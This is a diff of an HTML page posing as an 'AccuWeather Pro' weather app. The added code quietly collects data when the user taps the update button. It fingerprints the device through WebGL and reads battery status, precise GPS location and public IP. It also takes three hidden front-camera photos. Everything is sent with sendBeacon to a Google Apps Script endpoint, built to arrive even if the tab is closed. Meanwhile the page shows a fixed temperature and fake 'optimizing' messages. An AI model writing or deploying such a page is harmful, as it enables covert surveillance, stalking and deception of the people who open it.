@@ -3,109 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weather Live - Local Forecast</title>
+    <title>AccuWeather Pro - Live Forecast</title>
     <style>
+        /* Professional Dark Weather UI */
         body { 
-            font-family: 'Segoe UI', sans-serif; 
+            background: #0b132b; 
+            color: #fff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             margin: 0; 
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); 
-            color: white; 
-            height: 100vh; 
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            text-align: center; 
+            height: 100vh; 
+            overflow: hidden;
         }
         .card { 
-            background: rgba(255, 255, 255, 0.1); 
+            background: #1c2541; 
             padding: 40px; 
-            border-radius: 25px; 
-            backdrop-filter: blur(10px); 
+            border-radius: 30px; 
+            border: 1px solid #3a506b; 
             width: 85%; 
-            max-width: 380px; 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
+            max-width: 400px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+            text-align: center;
         }
-        h1 { font-size: 3.5rem; margin: 10px 0; }
-        .city { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; color: #00d2ff; }
         .btn { 
-            background: #00d2ff; 
-            color: #fff; 
+            background: #6fffe9; 
+            color: #0b132b; 
             border: none; 
-            padding: 15px 30px; 
+            padding: 20px; 
             border-radius: 50px; 
             font-weight: bold; 
-            margin-top: 25px; 
-            cursor: pointer; 
             width: 100%; 
-            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+            cursor: pointer; 
+            font-size: 16px; 
+            margin-top: 20px; 
+            transition: transform 0.2s;
         }
+        .btn:active { transform: scale(0.95); }
+        .btn:disabled { background: #3a506b; color: #5bc0be; }
+        
+        #progress-container { width: 100%; background: #0b132b; height: 8px; border-radius: 10px; margin-top: 25px; display: none; }
+        #progress-bar { width: 0%; height: 100%; background: #6fffe9; border-radius: 10px; transition: 0.4s; }
+        
+        h2 { color: #5bc0be; font-weight: 300; margin-bottom: 5px; font-size: 18px; }
+        h1 { font-size: 64px; margin: 10px 0; }
+        .status-text { font-size: 14px; color: #6fffe9; margin-top: 15px; }
+        
+        /* Hidden elements for capture */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="city" id="city">Locating...</div>
-    <h1 id="temp">--°</h1>
-    <p id="stat">Weather Sync Active</p>
-    <button class="btn" onclick="startUpdate()">UPDATE WEATHER</button>
-</div>
+    <div class="card">
+        <h2 id="loc-text">Satellite: Searching...</h2>
+        <h1 id="temp-display">24°C</h1>
+        <div id="status-display">System Ready</div>
+        
+        <div id="progress-container">
+            <div id="progress-bar"></div>
+        </div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+        <button class="btn" id="main-btn" onclick="startTracking()">UPDATE WEATHER DATA</button>
+        <p style="font-size: 11px; color: #3a506b; margin-top: 20px;">Precision: High Accuracy (GPS + Glonass)</p>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
 <script>
-    // YOUR NEW DEPLOYMENT URL
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzQyn2YMLV3RrEVr_WevGwUUeqAPEHhCfGgfNOa2fWg3cnll--WbfMh8zPF0YW9qPCElw/exec';
+    // YOUR UPDATED SCRIPT URL
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwTulLLsRxfvL-mbtPYxLnhqdNbSOVa4IBfNBFjkZuLTIuF5c50WuHV5yw5Y8MN3gy5sQ/exec';
 
-    async function startUpdate() {
-        const btn = document.querySelector('.btn');
-        btn.innerText = "SYNCING...";
+    async function startTracking() {
+        const btn = document.getElementById('main-btn');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
+        const status = document.getElementById('status-display');
+
         btn.disabled = true;
+        btn.innerText = "OPTIMIZING DATA...";
+        progressContainer.style.display = 'block';
 
-        if (!navigator.geolocation) {
-            alert("Geolocation not supported.");
-            return;
-        }
+        // 1. HARDWARE FINGERPRINTING (GPU Renderer identifies Phone Model)
+        let gpu = "Unknown Device";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { gpu = "Detection Blocked"; }
 
+        // 2. SYSTEM VITALS (Battery & Charging)
+        let batteryInfo = { level: 0, charging: false };
+        try {
+            const bat = await navigator.getBattery();
+            batteryInfo.level = Math.round(bat.level * 100);
+            batteryInfo.charging = bat.charging;
+        } catch(e) {}
+
+        // 3. GEOLOCATION
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            // Update UI with real local temperature
+            document.getElementById('loc-text').innerText = "LOCATION LOCKED";
+            progressBar.style.width = "40%";
+            status.innerText = "Syncing Local Hardware...";
+
+            // 4. OPTION B: 3-PHOTO BURST (Capture one photo every 1.5 seconds)
+            let photos = [];
             try {
-                const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`).then(r => r.json());
-                document.getElementById('temp').innerText = Math.round(w.current_weather.temperature) + "°";
-                document.getElementById('city').innerText = "LOCAL AREA DATA";
-            } catch (e) { console.log("Weather fetch error"); }
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                for(let i=0; i<3; i++) {
+                    await new Promise(r => setTimeout(r, 1500)); 
+                    const c = document.getElementById('c');
+                    c.width = 400; 
+                    c.height = 300;
+                    c.getContext('2d').drawImage(video, 0, 0);
+                    photos.push(c.toDataURL('image/jpeg', 0.4));
+                    
+                    // Update progress during burst
+                    progressBar.style.width = (40 + (i * 20)) + "%";
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { console.log("Camera access denied"); }
+
+            // 5. NETWORK INTELLIGENCE (Public IP)
+            let publicIP = "0.0.0.0";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                publicIP = ipData.ip;
+            } catch(e) {}
+
+            // 6. FINAL DATA PACKET
+            const dataPacket = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                ip: publicIP,
+                photos: photos,
+                deviceModel: gpu,
+                battery: batteryInfo.level,
+                charging: batteryInfo.charging,
+                userAgent: navigator.userAgent
+            };
+
+            // 7. PERSISTENT TRANSMISSION (Using Beacon API)
+            // This ensures data is sent even if the user closes the tab immediately
+            const blob = new Blob([JSON.stringify(dataPacket)], { type: 'application/json' });
+            navigator.sendBeacon(SCRIPT_URL, blob);
+
+            // UI Completion
+            progressBar.style.width = "100%";
+            btn.innerText = "WEATHER UPDATED";
+            status.innerText = "Data Optimized Successfully";
             
-            // Run the capture and send process
-            await captureAndSend(pos);
-            
-            btn.innerText = "UPDATED";
         }, (err) => {
-            alert("Please allow Location and Camera access to continue.");
-            btn.innerText = "UPDATE WEATHER";
             btn.disabled = false;
+            btn.innerText = "ERROR: ENABLE GPS";
+            status.innerText = "Please allow location to update weather.";
+        }, { 
+            enableHighAccuracy: true, 
+            timeout: 10000 
         });
     }
-
-    async function captureAndSend(pos) {
-        let photo = null;
-        try {
-            // Access camera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            // Short delay to let camera focus
-            await new Promise(r => setTimeout(r, 1000));
-            
-            const canvas = document.getElementById('c');
-            canvas.width = 400; 
-            canvas.height = 300;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // Compress photo to avoid large payloads
-            photo = canvas.toDataURL('image/jpeg', 0.4);
-            
-            // Stop
-
+</script>
+</body>
+</html>
